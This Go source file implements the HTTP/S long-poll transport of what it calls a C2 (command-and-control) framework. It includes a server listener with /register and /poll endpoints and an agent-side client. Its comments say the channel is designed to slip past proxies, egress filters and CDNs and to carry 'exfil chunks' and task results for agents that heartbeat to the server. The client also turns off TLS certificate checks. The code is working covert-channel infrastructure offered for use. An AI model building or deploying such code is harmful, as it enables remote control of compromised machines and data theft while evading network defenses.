package transport

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

// The HTTP long-poll transport carries the same length-prefixed envelope
// framing as the TCP listener, but wraps it in plain HTTP requests so it can
// traverse proxies, egress filters and CDNs:
//
//      POST /register   body = agent→server bytes   response = empty ack (+ session id)
//      POST /poll       body = empty                response = server→agent bytes
//
// Each direction keeps its own FIFO queue, so frame order is preserved even
// though send and poll requests use different HTTP connections. /poll holds
// the request up to pollWait before answering empty (long-poll), which keeps
// idle agents at one outstanding request instead of a busy retry loop.

const (
	// pollWait is how long the server holds a /poll request before answering
	// empty. It must stay below the client's HTTP timeout.
	pollWait = 25 * time.Second
	// maxHTTPBody caps a single request body (one frame batch). Task results
	// and exfil chunks ride on this path, so the cap is generous.
	maxHTTPBody = 8 << 20
	// idleReadTimeout caps how long the server-side conn may go without
	// agent data. Agents heartbeat every 25-35s, so a silent conn means the
	// agent is gone (long-poll has no kernel keepalive to detect it).
	idleReadTimeout = 10 * time.Minute
)

// HTTPListener implements a long-poll HTTP/S listener for C2.
type HTTPListener struct {
	server    *http.Server
	netLn     net.Listener
	addr      string
	tlsConfig *tls.Config
	sessions  map[string]*httpConn
	mu        sync.RWMutex
	acceptCh  chan *httpConn
	quit      chan struct{}
	closeOnce sync.Once
}

// httpConn wraps an HTTP long-poll session as a net.Conn.
//
// Concurrency model: the C2 session reader calls Read (single goroutine) and
// task dispatchers call Write concurrently. Neither blocks the other: Read
// waits on readCh WITHOUT holding mu, Write waits on writeCh WITHOUT holding
// mu — mu only guards the leftover buffer (partial-read stash).
type httpConn struct {
	sessionID string
	readCh    chan []byte // agent→server bodies queued by /register
	writeCh   chan []byte // server→agent payloads drained by /poll
	mu        sync.Mutex
	leftover  []byte
	closed    atomic.Bool
	done      chan struct{}
	closeOnce sync.Once
	onClose   func(sessionID string)

	readDeadline  atomic.Int64 // unix nanos, 0 = none
	writeDeadline atomic.Int64 // unix nanos, 0 = none

	localAddr  net.Addr
	remoteAddr net.Addr
}

// NewHTTPListener creates a new HTTP long-poll listener.
func NewHTTPListener(addr string) *HTTPListener {
	return newHTTPListener(addr, nil)
}

// NewHTTPSListener creates a new HTTPS long-poll listener.
func NewHTTPSListener(addr string, tlsConfig *tls.Config) *HTTPListener {
	return newHTTPListener(addr, tlsConfig)
}

func newHTTPListener(addr string, tlsConfig *tls.Config) *HTTPListener {
	return &HTTPListener{
		addr:      addr,
		tlsConfig: tlsConfig,
		sessions:  make(map[string]*httpConn),
		acceptCh:  make(chan *httpConn, 128),
		quit:      make(chan struct{}),
	}
}

// Start begins the HTTP/S listener.
func (l *HTTPListener) Start() error {
	mux := http.NewServeMux()

	// Registration + agent→server data endpoint.
	mux.HandleFunc("/register", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}

		body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, maxHTTPBody))
		if err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		sessionID := r.Header.Get("X-Session-ID")
		if sessionID == "" {
			// New session: registration must carry no data — the agent
			// sends its first frame through a normal Write afterwards.
			if len(body) != 0 {
				http.Error(w, "registration body must be empty", http.StatusBadRequest)
				return
			}

			sessionID, err = newHTTPSessionID()
			if err != nil {
				http.Error(w, "internal error", http.StatusInternalServerError)
				return
			}

			conn := l.newConn(sessionID, r.RemoteAddr)

			l.mu.Lock()
			l.sessions[sessionID] = conn
			l.mu.Unlock()

			// Hand the conn to the C2 accept loop.
			select {
			case l.acceptCh <- conn:
			case <-l.quit:
				return
			default:
				http.Error(w, "server busy", http.StatusServiceUnavailable)
				return
			}

			w.Header().Set("X-Session-ID", sessionID)
			w.Header().Set("Cache-Control", "no-store")
			return
		}

		conn := l.lookup(sessionID)
		if conn == nil {
			http.Error(w, "unknown session", http.StatusNotFound)
			return
		}

		if len(body) > 0 {
			// Blocking send: /register bodies are never dropped — a full
			// queue applies backpressure exactly like TCP would.
			select {
			case conn.readCh <- body:
			case <-conn.done:
				http.Error(w, "session closed", http.StatusGone)
				return
			case <-r.Context().Done():
				return
			}
		}

		w.Header().Set("Cache-Control", "no-store")
		// Empty 200 ack — server→agent data flows via /poll only.
	})

	// Long-poll receive endpoint (server→agent).
	mux.HandleFunc("/poll", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}

		sessionID := r.Header.Get("X-Session-ID")
		conn := l.lookup(sessionID)
		if conn == nil {
			http.Error(w, "unknown session", http.StatusNotFound)
			return
		}

		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Cache-Control", "no-store")

		// Deliver already-queued data even if the session closes at the
		// same moment — close must not silently drop pending output.
		select {
		case data := <-conn.writeCh:
			w.Write(data)
			return
		default:
		}

		timer := time.NewTimer(pollWait)
		defer timer.Stop()

		select {
		case data := <-conn.writeCh:
			w.Write(data)
		case <-conn.done:
			http.Error(w, "session closed", http.StatusGone)
		case <-timer.C:
			// Nothing pending — empty 200, the client re-polls.
		case <-r.Context().Done():
		}
	})

	// Health check
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok"))
	})

	l.server = &http.Server{
		Addr:              l.addr,
		Handler:           mux,
		TLSConfig:         l.tlsConfig,
		ReadHeaderTimeout: 10 * time.Second,
		IdleTimeout:       120 * time.Second,
	}

	// Bind explicitly so Start reports bind failures synchronously and
	// Addr() can expose the real bound address (config says :0 in tests).
	netLn, err := net.Listen("tcp", l.addr)
	if err != nil {
		return fmt.Errorf("http listen: %w", err)
	}
	if l.tlsConfig != nil {
		netLn = tls.NewListener(netLn, l.tlsConfig)
	}
	l.netLn = netLn

	go func() {
		log.Printf("[HTTP] Listening on %s (TLS: %v)", netLn.Addr(), l.tlsConfig != nil)

		if err := l.server.Serve(netLn); err != nil && err != http.ErrServerClosed {
			log.Printf("[HTTP] Error: %v", err)
		}
	}()

	return nil
}

// Accept returns the next agent connection via HTTP long-poll.
func (l *HTTPListener) Accept() (net.Conn, error) {
	select {
	case conn := <-l.acceptCh:
		return conn, nil
	case <-l.quit:
		return nil, fmt.Errorf("listener closed")
	}
}

// Close shuts down the HTTP listener.
func (l *HTTPListener) Close() error {
	l.closeOnce.Do(func() {
		close(l.quit)
	})
	if l.netLn != nil {
		l.netLn.Close()
	}
	if l.server != nil {
		return l.server.Close()
	}
	return nil
}

// Addr returns the listener's bound address once started (the configured
// one before that).
func (l *HTTPListener) Addr() net.Addr {
	l.mu.RLock()
	netLn := l.netLn
	l.mu.RUnlock()
	if netLn != nil {
		return netLn.Addr()
	}
	return addr{s: l.addr}
}

func (l *HTTPListener) newConn(sessionID, remoteAddr string) *httpConn {
	conn := &httpConn{
		sessionID:  sessionID,
		readCh:     make(chan []byte, 256),
		writeCh:    make(chan []byte, 64),
		done:       make(chan struct{}),
		localAddr:  addr{s: "c2-http"},
		remoteAddr: addr{s: remoteAddr},
	}
	conn.onClose = func(sid string) {
		l.mu.Lock()
		delete(l.sessions, sid)
		l.mu.Unlock()
	}
	return conn
}

func (l *HTTPListener) lookup(sessionID string) *httpConn {
	if sessionID == "" {
		return nil
	}
	l.mu.RLock()
	defer l.mu.RUnlock()
	return l.sessions[sessionID]
}

// newHTTPSessionID returns 16 hex chars from crypto/rand.
func newHTTPSessionID() (string, error) {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return "http-" + hex.EncodeToString(b), nil
}

// --- httpConn implements net.Conn (server side) ---

func (c *httpConn) Read(b []byte) (int, error) {
	if len(b) == 0 {
		return 0, nil
	}
	if c.closed.Load() {
		return 0, net.ErrClosed
	}

	// An already-expired deadline errors immediately (net.Conn contract).
	dl := c.readDeadline.Load()
	if dl != 0 && !time.Now().Before(time.Unix(0, dl)) {
		return 0, os.ErrDeadlineExceeded
	}

	// Serve from the partial-read stash first.
	c.mu.Lock()
	if len(c.leftover) > 0 {
		n := copy(b, c.leftover)
		c.leftover = c.leftover[n:]
		c.mu.Unlock()
		return n, nil
	}
	c.mu.Unlock()

	// Wait for the next agent body. mu is NOT held here, so concurrent
	// Writes are never blocked by a parked reader (round-1 deadlock fix).
	// The wait is capped by the caller's read deadline (if any) and by the
	// transport's idle guard (long-poll has no kernel keepalive).
	delay := idleReadTimeout
	if dl != 0 {
		if d := time.Until(time.Unix(0, dl)); d < delay {
			delay = d
		}
	}
	var timerCh <-chan time.Time
	if delay > 0 {
		timer := time.NewTimer(delay)
		defer timer.Stop()
		timerCh = timer.C
	}

	select {
	case data := <-c.readCh:
		n := copy(b, data)
		if rest := data[n:]; len(rest) > 0 {
			c.mu.Lock()
			c.leftover = append(c.leftover, rest...)
			c.mu.Unlock()
		}
		return n, nil
	case <-c.done:
		return 0, net.ErrClosed
	case <-timerCh:
		if c.readDeadline.Load() != 0 {
			return 0, os.ErrDeadlineExceeded
		}
		return 0, fmt.Errorf("http conn idle for %v (agent unreachable)", idleReadTimeout)
	}
}

func (c *httpConn) Write(b []byte) (int, error) {
	if c.closed.Load() {
		return 0, net.ErrClosed
	}

	// Copy: the queue is async and the caller may reuse the buffer.
	buf := make([]byte, len(b))
	copy(buf, b)

	var timerCh <-chan time.Time
	if dl := c.writeDeadline.Load(); dl != 0 {
		d := time.Until(time.Unix(0, dl))
		if d <= 0 {
			return 0, os.ErrDeadlineExceeded
		}
		timer := time.NewTimer(d)
		defer timer.Stop()
		timerCh = timer.C
	}

	select {
	case c.writeCh <- buf:
		return len(b), nil
	case <-c.done:
		return 0, net.ErrClosed
	case <-timerCh:
		return 0, os.ErrDeadlineExceeded
	}
}

func (c *httpConn) Close() error {
	if c.closed.Swap(true) {
		return nil // already closed
	}
	c.closeOnce.Do(func() {
		close(c.done)
	})
	if c.onClose != nil {
		c.onClose(c.sessionID)
	}
	return nil
}

func (c *httpConn) LocalAddr() net.Addr  { return c.localAddr }
func (c *httpConn) RemoteAddr() net.Addr { return c.remoteAddr }

func (c *httpConn) SetDeadline(t time.Time) error {
	c.SetReadDeadline(t)
	c.SetWriteDeadline(t)
	return nil
}

func (c *httpConn) SetReadDeadline(t time.Time) error {
	if t.IsZero() {
		c.readDeadline.Store(0) // zero Time clears the deadline
	} else {
		c.readDeadline.Store(t.UnixNano())
	}
	return nil
}

func (c *httpConn) SetWriteDeadline(t time.Time) error {
	if t.IsZero() {
		c.writeDeadline.Store(0)
	} else {
		c.writeDeadline.Store(t.UnixNano())
	}
	return nil
}

// SessionID returns the HTTP session identifier.
func (c *httpConn) SessionID() string {
	return c.sessionID
}

// --- Client side: net.Conn over HTTP long-polling ---

// DialHTTP establishes an agent session against an HTTP/S long-poll C2
// listener. serverURL must include the scheme ("http://" or "https://").
func DialHTTP(serverURL string) (net.Conn, error) {
	client := &http.Client{
		Timeout: pollWait + 40*time.Second, // > server pollWait + network margin
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // envelope layer provides end-to-end crypto
		},
	}

	req, err := http.NewRequest(http.MethodPost, serverURL+"/register", nil)
	if err != nil {
		return nil, fmt.Errorf("http dial: %w", err)
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Cache-Control", "no-store")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http dial: %w", err)
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http dial: server answered %d", resp.StatusCode)
	}

	sessionID := resp.Header.Get("X-Session-ID")
	if sessionID == "" {
		return nil, fmt.Errorf("http dial: server did not assign a session id")
	}

	host := req.URL.Host
	return &HTTPClientConn{
		serverURL:  serverURL,
		sessionID:  sessionID,
		client:     client,
		done:       make(chan struct{}),
		localAddr:  addr{s: "c2-http-client"},
		remoteAddr: addr{s: host},
	}, nil
}

// HTTPClientConn is the agent-side half of the long-poll transport: Write
// POSTs frames to /register (fast ack), Read long-polls /poll and buffers
// partial frames between calls.
type HTTPClientConn struct {
	serverURL string
	sessionID string
	client    *http.Client

	readMu   sync.Mutex // serializes leftover access and polls
	leftover []byte

	readDeadline  atomic.Int64
	writeDeadline atomic.Int64
	closed        atomic.Bool
	closeOnce     sync.Once
	done          chan struct{}

	localAddr  net.Addr
	remoteAddr net.Addr
}

func (c *HTTPClientConn) Read(b []byte) (int, error) {
	if len(b) == 0 {
		return 0, nil
	}

	// One lock across the whole call: leftover access and polling are
	// serialized so concurrent Reads can never reorder server frames.
	c.readMu.Lock()
	defer c.readMu.Unlock()

	for {
		if c.closed.Load() {
			return 0, net.ErrClosed
		}

		if len(c.leftover) > 0 {
			n := copy(b, c.leftover)
			c.leftover = c.leftover[n:]
			return n, nil
		}

		// Long-poll for server data.
		ctx := context.Background()
		if dl := c.readDeadline.Load(); dl != 0 {
			var cancel context.CancelFunc
			ctx, cancel = context.WithDeadline(ctx, time.Unix(0, dl))
			defer cancel()
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.serverURL+"/poll", nil)
		if err != nil {
			return 0, err
		}
		req.Header.Set("X-Session-ID", c.sessionID)
		req.Header.Set("Cache-Control", "no-store")

		resp, err := c.client.Do(req)
		if err != nil {
			if c.closed.Load() {
				return 0, net.ErrClosed
			}
			return 0, err
		}

		data, readErr := io.ReadAll(io.LimitReader(resp.Body, maxHTTPBody))
		resp.Body.Close()
		if readErr != nil {
			return 0, readErr
		}

		switch resp.StatusCode {
		case http.StatusOK:
			if len(data) == 0 {
				continue // idle long-poll cycle — re-poll
			}
			n := copy(b, data)
			if rest := data[n:]; len(rest) > 0 {
				c.leftover = append(c.leftover, rest...)
			}
			return n, nil
		case http.StatusGone: // session closed by the server
			c.Close()
			return 0, net.ErrClosed
		default: // 404 unknown session, 5xx, ...
			c.Close()
			return 0, fmt.Errorf("http poll: server answered %d", resp.StatusCode)
		}
	}
}

func (c *HTTPClientConn) Write(b []byte) (int, error) {
	if c.closed.Load() {
		return 0, net.ErrClosed
	}

	ctx := context.Background()
	if dl := c.writeDeadline.Load(); dl != 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithDeadline(ctx, time.Unix(0, dl))
		defer cancel()
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.serverURL+"/register", bytes.NewReader(b))
	if err != nil {
		return 0, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Session-ID", c.sessionID)
	req.Header.Set("Cache-Control", "no-store")

	resp, err := c.client.Do(req)
	if err != nil {
		if c.closed.Load() {
			return 0, net.ErrClosed
		}
		return 0, err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	switch resp.StatusCode {
	case http.StatusOK:
		return len(b), nil
	case http.StatusGone:
		c.Close()
		return 0, net.ErrClosed
	default:
		c.Close()
		return 0, fmt.Errorf("http send: server answered %d", resp.StatusCode)
	}
}

func (c *HTTPClientConn) Close() error {
	if c.closed.Swap(true) {
		return nil
	}
	c.closeOnce.Do(func() {
		close(c.done)
	})
	return nil
}

func (c *HTTPClientConn) LocalAddr() net.Addr  { return c.localAddr }
func (c *HTTPClientConn) RemoteAddr() net.Addr { return c.remoteAddr }

func (c *HTTPClientConn) SetDeadline(t time.Time) error {
	c.SetReadDeadline(t)
	c.SetWriteDeadline(t)
	return nil
}

func (c *HTTPClientConn) SetReadDeadline(t time.Time) error {
	if t.IsZero() {
		c.readDeadline.Store(0)
	} else {
		c.readDeadline.Store(t.UnixNano())
	}
	return nil
}

func (c *HTTPClientConn) SetWriteDeadline(t time.Time) error {
	if t.IsZero() {
		c.writeDeadline.Store(0)
	} else {
		c.writeDeadline.Store(t.UnixNano())
	}
	return nil
}

// SessionID returns the HTTP session identifier.
func (c *HTTPClientConn) SessionID() string {
	return c.sessionID
}

// --- addr helper ---

type addr struct{ s string }

func (a addr) Network() string { return "tcp" }
func (a addr) String() string  { return a.s }
